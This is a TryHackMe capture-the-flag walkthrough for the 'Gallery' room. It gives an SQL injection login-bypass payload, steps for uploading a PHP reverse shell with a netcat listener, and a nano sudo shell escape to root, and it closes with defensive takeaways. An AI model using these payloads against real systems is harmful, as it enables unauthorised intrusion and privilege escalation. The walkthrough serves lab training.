# 🖼️ Gallery — TryHackMe Walkthrough

**Room:** [Gallery](https://tryhackme.com/room/gallery666)
**Difficulty:** Easy
**Category:** Web / SQL Injection / Privilege Escalation
**Tags:** SQLi, Authentication Bypass, File Upload, Linux, Privilege Escalation

---

## 📋 Overview

Gallery is a boot-to-root room involving SQL injection for initial access, file upload for a shell, and Linux privilege escalation. You'll bypass login, upload a PHP reverse shell, and escalate to root.

---

## 🔧 Tools Used

- `nmap` — Port scanning
- Browser / Burp Suite — Web exploitation
- PHP reverse shell — Initial foothold
- `sudo -l`, `nano` — Privilege escalation

---

## 📡 Step 1: Nmap Scan

```bash
nmap -sV -sC <TARGET_IP>
```

Find open ports — typically port 80 (HTTP) and 22 (SSH).

---

## 🌐 Step 2: Web Enumeration

Navigate to `http://<TARGET_IP>`. You'll find an image gallery application with a login form. Run GoBuster to find additional paths:

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Find the admin login panel.

---

## 💉 Step 3: SQL Injection — Auth Bypass

Bypass the login form using a classic SQLi payload:

```
Username: admin' or '1'='1'-- -
Password: anything
```

This logs you in as admin without knowing the password.

---

## 📤 Step 4: File Upload — PHP Shell

Inside the admin panel, find the file upload feature. Upload a PHP reverse shell (from `/usr/share/webshells/php/php-reverse-shell.php`). Modify the IP and port:

```php
$ip = '<YOUR_IP>';
$port = 4444;
```

Set up your listener:
```bash
nc -lvnp 4444
```

Navigate to the uploaded shell URL to trigger execution.

---

## 🔼 Step 5: Privilege Escalation

Stabilise your shell:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Find the user flag:
```bash
find / -name user.txt 2>/dev/null
```

Check sudo permissions:
```bash
sudo -l
```

A common finding is the ability to run `nano` or a script as root. For nano:
```
# In nano, use Ctrl+R Ctrl+X to execute commands:
reset; sh 1>&0 2>&0
```

This drops you into a root shell.

---

## 🚩 Capture the Flags

```bash
cat /home/<user>/user.txt
cat /root/root.txt
```

---

## 📝 Key Takeaways

- SQL injection for authentication bypass is a critical web vulnerability — parameterised queries prevent it.
- File upload vulnerabilities require proper validation of file type and content.
- `sudo -l` is always the first check for privilege escalation — many misconfigured sudo entries allow shell escapes.
- [GTFOBins](https://gtfobins.github.io/) documents how common binaries can be abused.

---

## 🔗 References

- [GTFOBins — nano](https://gtfobins.github.io/gtfobins/nano/)
- [TryHackMe — Gallery Room](https://tryhackme.com/room/gallery666)
- [Walkthrough Reference](https://medium.com/@doboszmichal4/gallery-tryhackme-walkthrough-romedix-b047600bc9c8)
